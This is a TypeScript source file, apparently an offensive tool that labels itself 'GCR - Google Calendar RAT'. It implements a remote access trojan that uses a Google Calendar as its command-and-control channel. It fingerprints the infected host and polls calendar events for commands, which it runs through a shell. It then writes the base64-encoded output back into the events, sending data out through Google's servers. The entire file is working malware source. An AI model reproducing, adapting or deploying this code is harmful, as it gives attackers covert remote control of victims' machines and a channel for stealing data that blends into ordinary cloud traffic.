import { exec } from "node:child_process";
import os, { networkInterfaces } from "os";
import { promises as fs } from "fs";
import { promisify } from "util";
import crypto from "crypto";

import { google } from "googleapis";

const execAsync = promisify(exec);

// === Configuration ===
const C2_CALENDAR = Bun.env.email;
const POLLING_TIME = 0;
const EVENT_DATE = new Date("2025-05-31T00:00:00Z").toISOString();
const CREDENTIALS_FILE = "credentials.json";

// === Helper Functions ===

function printBanner() {
  const banner = `
                                                     __           
                                                  /  |          
  ______    ______    ______    ______    ______  $$ |  ______  
 /      \  /      \  /      \  /      \  /      \ $$ | /      \ 
/$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |$$ |/$$$$$$  |
$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |$$    $$ |
$$ \__$$ |$$ \__$$ |$$ \__$$ |$$ \__$$ |$$ \__$$ |$$ |$$$$$$$$/ 
$$    $$ |$$    $$/ $$    $$/ $$    $$ |$$    $$ |$$ |$$       |
 $$$$$$$ | $$$$$$/   $$$$$$/   $$$$$$$ | $$$$$$$ |$$/  $$$$$$$/ 
/  \__$$ |                    /  \__$$ |/  \__$$ |              
$$    $$/                     $$    $$/ $$    $$/               
 $$$$$$/                       $$$$$$/   $$$$$$/               `;

  console.log(banner);
  Bun.sleep(1500);
}

function generateHashMD5(): string {
  const hostname = os.hostname();
  const nets = networkInterfaces();
  const macAddress = Object.values(nets)
    .flat()
    .find((iface) => iface?.mac && iface.mac !== "00:00:00:00:00:00")?.mac;

  if (!macAddress) throw new Error("No MAC address found");

  const data = hostname + macAddress.replace(/:/g, "");
  const hash = crypto.createHash("md5").update(data).digest("hex");
  console.log(`[+] Generated unique ID: ${hash}`);
  return hash;
}

async function getCalendarService() {
  const content = await fs.readFile(CREDENTIALS_FILE, "utf8");
  const auth = new google.auth.GoogleAuth({
    keyFile: "./credentials.json",
    scopes: ["https://www.googleapis.com/auth/calendar"],
  });

  const calendar = google.calendar({ version: "v3", auth });
  return calendar;
}

async function getSortedEvents(calendar: any, date: string): Promise<any[]> {
  const start_date = date.slice(0, 10) + "T00:00:00Z";
  const end_date =
    new Date(new Date(start_date).getTime() + 24 * 60 * 60 * 1000)
      .toISOString()
      .slice(0, 10) + "T23:59:59Z";

  const res = await calendar.events.list({
    calendarId: C2_CALENDAR,
    timeMin: start_date,
    timeMax: end_date,
    singleEvents: true,
    orderBy: "startTime",
  });

  return res.data.items || [];
}

async function executeCommand(command: string): Promise<string> {
  console.log(`[+] Executing command: '${command}'`);
  try {
    const { stdout } = await execAsync(command);
    return Buffer.from(stdout).toString("base64");
  } catch (e) {
    console.error("[-] Error during execution");
    return "";
  }
}

async function createFirstConnection(id: string, calendar: any) {
  const event = {
    summary: id,
    start: {
      dateTime: "2025-05-31T00:00:00Z",
      timeZone: "Europe/Rome",
    },
    end: {
      dateTime: "2025-05-31T00:00:00Z",
      timeZone: "Europe/Rome",
    },
    description: "whoami|",
  };

  const createdEvent = await calendar.events.insert({
    calendarId: C2_CALENDAR,
    resource: event,
  });

  console.log(`[+] New connection initialized: ${createdEvent.data.summary}`);
}

// === Main Function ===

async function main() {
  printBanner();
  console.log("[+] GCR - Google Calendar RAT");

  const id = generateHashMD5();

  const calendar = await getCalendarService();

  while (true) {
    if (POLLING_TIME > 0) await Bun.sleep(POLLING_TIME);

    const events = await getSortedEvents(calendar, EVENT_DATE);
    let counter = 0;

    for (const event of events) {
      const summary = event.summary || "";

      if (summary === id) {
        counter++;
        const eventId = event.id;
        const oldDescription = event.description || "Description not found";

        try {
          const [command, encodedResult] = oldDescription.split("|");

          if (command && !encodedResult) {
            const output = await executeCommand(command);
            const newDescription = `${command}|${output}`;

            await calendar.events.patch({
              calendarId: C2_CALENDAR,
              eventId: eventId,
              requestBody: {
                description: newDescription,
              },
            });

            console.log(`[+] Sent command output for: ${command}`);
          }
        } catch (err) {
          console.error("[-] Error parsing command or updating event");
        }
      }
    }

    if (counter === 0) {
      await createFirstConnection(id, calendar);
    }
  }
}

main().catch(console.error);
